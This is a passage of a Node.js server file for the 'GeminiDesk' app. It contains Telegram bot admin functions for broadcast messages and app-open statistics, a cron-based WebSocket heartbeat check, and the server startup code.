    }
}
    

function showBroadcastMenu(chatId, messageId) {
    const text = 'Broadcast management options:';
    const keyboard = {
        inline_keyboard: [
            [{ text: '✍️ Send New Plain Text', callback_data: 'awaiting_broadcast_text' }],
            [{ text: '📄 Send New HTML File', callback_data: 'awaiting_broadcast_html' }],
            [{ text: '👁️ View/Delete Active Message', callback_data: 'view_active_message' }],
            [{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]
        ]
    };
    return bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: keyboard });
}

function viewActiveMessage(chatId, messageId) {
    const msg = cache.get('latest_message');
    if (msg) {
        const contentPreview = msg.content.substring(0, 300) + (msg.content.length > 300 ? '...' : '');
        const text = `👁️ *Active Broadcast*\n*Type:* \`${msg.type}\` | *ID:* \`${msg.id}\`\n---\n*Preview:*\n\`\`\`\n${contentPreview}\n\`\`\``;
        return bot.editMessageText(text, {
            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [
                [{ text: '🗑️ Delete This Message', callback_data: 'delete_active_message_confirm' }],
                [{ text: '‹ Back', callback_data: 'broadcast_menu' }]
            ]}
        });
    }
    return bot.editMessageText('ℹ️ There is no active broadcast message.', {
        chat_id: chatId, message_id: messageId,
        reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
    });
}

function getStats() {
    const totalPings = cache.get('stats:total_pings') || 0;
    const versionKeys = cache.keys().filter(k => k.startsWith('stats:version:'));
    let versionStats = 'No version data.';
    if (versionKeys.length > 0) {
      versionStats = versionKeys.map(key => `\`${key.replace('stats:version:', '')}\`: *${cache.get(key)}* opens`).join('\n');
    }
    return `📊 *GeminiDesk Analytics*\n\n*Total App Opens:* ${totalPings}\n\n*Opens by Version:*\n${versionStats}`;
}

cron.schedule('*/5 * * * *', () => {
    clients.forEach((client, clientId) => {
        if (client.ws.readyState === WebSocket.OPEN) {
            // בדוק אם הלקוח עדיין חי לפני שליחת ping נוסף
            if (client.isAlive === false) {
                console.log(`[Cron] Client ${client.name} failed heartbeat. Terminating.`);
                client.ws.terminate();
                clients.delete(clientId);
                return;
            }
            
            client.isAlive = false;
            client.ws.ping(() => {});
        } else {
            clients.delete(clientId);
        }
    });
});

// --- Server Start ---
server.listen(PORT, () => {
  console.log(`🚀 GeminiDesk Server with WebSocket support is running on port ${PORT}`);
});
